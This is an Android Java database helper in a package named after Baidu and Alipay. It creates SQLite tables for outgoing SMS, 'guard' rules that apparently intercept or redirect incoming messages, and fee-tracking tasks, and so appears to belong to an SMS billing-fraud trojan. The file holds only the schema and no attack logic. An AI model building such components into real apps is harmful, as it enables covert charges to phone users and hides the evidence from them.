package com.baidu.alipay;



import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class DataBaseHelper extends SQLiteOpenHelper{

	public DataBaseHelper(Context context) {
        super(context, Constant.DATABASENAME, null, Constant.DATABASENAMEVERSION);
    }
	
	@Override
	public void onCreate(SQLiteDatabase db) {
		//创建SmsSender表
		String sql = "create table if not exists AAA(key varchar(500) not null,random varchar(30) not null,report varchar(500) not null,refer varchar(50) not null , reason varchar(2000),sendstatus integer not null , guardstatus integer not null , sendsync integer not null , guardsync integer not null);";          

        db.execSQL(sql);
        
        //创建Sms表
        sql = "create table if not exists AAB(key varchar(500) not null , sendsmskey varchar(500) not null , status integer not null,primary key (key));";          

        db.execSQL(sql);
        
        //创建guard表										  
        sql = "create table if not exists AAC(key varchar(500) not null,smskey varchar(500) not null,smsnoleft varchar(50),guardcontent varchar(100),guardstart varchar(50),guardend varchar(50),guarddirect varchar(20),guardre varchar(500),guardtimeout varchar(50),islong varchar(10),recvsuccess varchar(10),status integer not null,starttime long not null,ismms varchar(10) null,guardredirectto varchar(50) null,setvalue varchar(100) null,primary key (key));";          

        db.execSQL(sql);
        
        //创建apptask表
        sql = "create table if not exists BBA(key varchar(500) not null,fee integer not null,status integer not null,applytime long not null,xml varchar(2000) null,errorTimes integer not null,synchStatus integer not null,abcd interger not null,primary key (key));";          

        db.execSQL(sql);
        
        //创建apptaskstat表
        sql = "create table if not exists BBB(totalfee integer not null,totalnum integer not null,succfee integer not null,succnum integer not null);";

        db.execSQL(sql);        
        
        //插入数据
        sql = "insert into BBB values (0,0,0,0);";
        
        db.execSQL(sql);
        
        //创建apptaskstat表
        sql = "create table if not exists userLog(key varchar(500) not null,status integer not null,logtime varchar(50) not null,logs varchar(2000) null,primary key (key));";

        db.execSQL(sql); 
    }
	
	@Override
	public void onUpgrade(SQLiteDatabase db, int arg1, int arg2) {
		
		
	}

}
